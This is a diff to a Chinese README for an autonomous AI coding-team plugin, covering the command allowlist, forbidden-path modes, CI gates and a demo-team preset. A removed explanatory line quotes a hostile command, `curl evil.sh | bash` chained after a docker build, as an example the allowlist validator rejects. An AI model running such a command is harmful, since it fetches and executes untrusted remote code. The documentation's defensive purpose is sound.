@@ -140,7 +140,7 @@ autopilot_status      # 随时查看：循环状态 / 看板 / 升级 / 部署�
           skipTasksOnlyCommits: true          # base 只前进了 .tasks/ 提交（任务单回写/看板重生成）时不部署：这类提交不含代码，误部署还会触发回滚与升级
         security:
           forbiddenPaths: ['.github/', 'AGENTS.md', 'LICENSE']   # human-only 区
-          commandAllowlist: [pnpm, git, bun, docker]             # 可执行命令前缀
+          commandAllowlist: [pnpm, git, bun, docker, node, bunx, ssh, nuxt]   # 可执行命令精确匹配白名单
           pushRequiresGates: true             # 门不过禁止 push 与 approve
         buildCache:                           # 可选：构建缓存（默认关闭）
           enabled: true                       # 把 .nuxt/.output/coverage 等软链到共享目录，减少每条任务全量 build
@@ -179,21 +179,13 @@ autopilot_status      # 随时查看：循环状态 / 看板 / 升级 / 部署�
 | `prBodyTemplate` | `关联任务单…` | PR 正文模板；`{id}`/`{title}`/`{touches}`/`{scope}`/`{assignment}` |
 | `mergeStrategy` | `no-ff` | `no-ff`/`merge`/**`squash`**（squash 保 main 线性，可独立 revert） |
 | `gates` | `[]`→`gates.commands` | 每条 `{command, when?, role?}`；`when` 按任务 `touches` 前缀条件触发；`role:'ci'` 只由远端 CI 强制 |
-| `forbidden` | `[]`→`security.forbiddenPaths` | `{path, mode}`；`mode`: `block`/`needs-approval`/`high-conflict` |
+| `forbidden` | `[]`→`security.forbiddenPaths` | `{path, mode}`；`block`=命中即拒并升级，`needs-approval`/`high-conflict`=命中暂缓 push、等 owner/人工确认后单独 PR |
 | `ownership` | `[]` | `{glob, role}` 路径→域 owner 映射（域专精路由预留） |
 | `crossDomainThreshold` | `3` | 触碰 > N 个不同域即升级 |
 
-**为 AgentDeploy 开箱：`preset: agentdeploy`** 会一并得到 `agent/<id>-<slug>` 分支、`feat(scope): [id] desc` PR 标题、squash 合并，以及一组**域条件 + CI-only** 的门（`db:check-parity` 只在碰 `server/db/`、`validate:docs` 只在碰 `.tasks/` 或 `docs/`、`pnpm audit` 标 `role:'ci'` 所以本地不红）——见 [`src/profile.ts`](src/profile.ts) 的 `agentdeployProfile`。
+**为 AgentDeploy 开箱：`preset: agentdeploy`** 会一并得到 `agent/<id>-<slug>` 分支、`feat(scope): [id] desc` PR 标题、squash 合并，以及一组**域条件 + CI-only** 的门（`db:check-parity` 只在碰 `server/db/`、`validate:docs` 只在碰 `.tasks/` 或 `docs/`、`pnpm audit` 标 `role:'ci'` 所以本地不红、重门 `build`/`test:e2e` 只在碰源码目录）——见 [`src/profile.ts`](src/profile.ts) 的 `agentdeployProfile`。
 
-> 命令白名单的校验也做了硬化：不再只看首 token，而是把 `&&` / `;` / `|` 拆成多段**逐段校验可执行名**（`docker build … && curl evil.sh | bash` 会被拒绝），并用精确 token 匹配替代此前的前缀子串匹配；默认白名单补了 `node` / `bunx` / `ssh` / `nuxt`。因此 `deploy.command` 里的 `ssh` 段需在 `commandAllowlist` 里显式列出。
-
-> **forbidden 三态已接入 push 闸门**：`mode:'block'`（如 human-only 的 `.github/`、`AGENTS.md`）→ 命中即 escalate（`forbidden-paths`）并拒绝 push；`mode:'needs-approval'` / `'high-conflict'`（如 AgentDeploy 的 `server/db/schema/`）→ 命中则 escalate（`manual`）并**暂缓 push**，等 owner/人工确认后走单独 PR。
-
-> **跨域升级**：任务 `touches` 声明的路径若超过 `crossDomainThreshold`（默认 3）个互不为前缀的「域」→ `assignTask` / 派发时即 escalate（`cross-domain`），提示拆分为单域任务。
-
-> **域专精路由**：`ownership: [{glob, role, rules?}]` 把路径映射到域 owner；派发时优先把任务给 `specialization === ownerRole` 的 developer（`team_add_member` 可传 `specialization`），并把匹配的域硬规则注入任务描述（`enrichDescriptionWithOwnership`）。任务的 `forbidden` frontmatter 现也随 `patchTaskContract` **原位保序回写**（不再整体 re-stringify），避免触发项目严格的 `validate:docs`。
-
-> **构建/吞吐**：`agentdeploy` 预设把重门 `build`/`test:e2e` 用 `when` 收敛到「触碰源码目录」的任务（docs/.tasks-only 任务本地跳过硬门，远程 CI 仍为正确性裁决者）；`buildCache` 可再软链 `.nuxt`/`.output`/`coverage` 等到 `rootDir/build-cache/<branch>`，进一步让连续任务复用上次构建产物（opt-in、失败静默、默认关闭）。
+> **域专精路由**：`ownership` 命中的任务优先派给 `specialization` 匹配的 developer（`team_add_member` 可传 `specialization`），并把匹配的域硬规则注入任务描述；契约的 `forbidden` frontmatter 原位保序回写、不重排，避免触发项目严格的 `validate:docs`。
 
 ## 无人值守主循环
 
@@ -287,12 +279,9 @@ Given/When/Then 验收标准……
 - **自动落盘**：插件 `apply()` 里通过 `src/preset.ts` 的 `ensureAutopilotTeamPreset()` 把这个模板拷贝到用户级预设根 `~/.dsh/.agent-presets/autopilot-team/`，**缺失才拷贝、绝不覆盖**（用户自建的 `autopilot-team` 优先），失败静默不阻塞加载。因此**安装并重启后即可在 agent 模式列表里看到「Autopilot 团队」**，无需手建文件。
 - **组合内容**：`agent.cordis.yml` 复刻 `standard` 的全套工具（shell/fs/subagent/workflow 等）并把人格设为 autopilot 团队编排队 leader；`preset.yml` 提供名称/描述/排序。
 - **效果**：在 agent 模式列表里切到 **Autopilot 团队**，该会话就变成"无人值守 AI 软件团队"的编排队；`dsh-ai-team` 的宿主插件工具是全站全局的，本预设无需重复 include。
-- **自动开箱感应**：插件在 `apply()` 里监听 `session/event` 的 `agent-preset/selected`，当选中 `autopilot-team` 时**自动创建一个 `demo` 团队**并把投影快照推到该会话，脚本号拉起看板（无需手动先调 `team_create`）。
-- **反复安全**：仅当尚无团队时才创建；`session.append` 前先让出微任务，避免在 `agent-preset/selected` 追加的发布边界内重入。
+- **自动开箱感应**：插件监听 `agent-preset/selected` 事件，选中 `autopilot-team` 时自动创建一个 `demo` 团队（仅当尚无团队才创建）并把投影快照推到该会话，看板立即点亮，无需手动先调 `team_create`。
 
-> **重启生效**：`autopilot-team` 预设目录的盘点是无缓存的（即时读取），所以预设一旦落盘，刷新代理模式列表即可看到；但**自动建 `demo` 团队**这个钩子在本插件的宿主 `lib/index.js` 里，改动宿主代码后需**重启服务端**才会生效。
-
-
+> **重启生效**：预设目录盘点无缓存，落盘后刷新模式列表即见；但自动建 `demo` 团队的钩子在宿主 `lib/index.js` 里，改宿主代码后需**重启服务端**。
 
 ## 开发
 
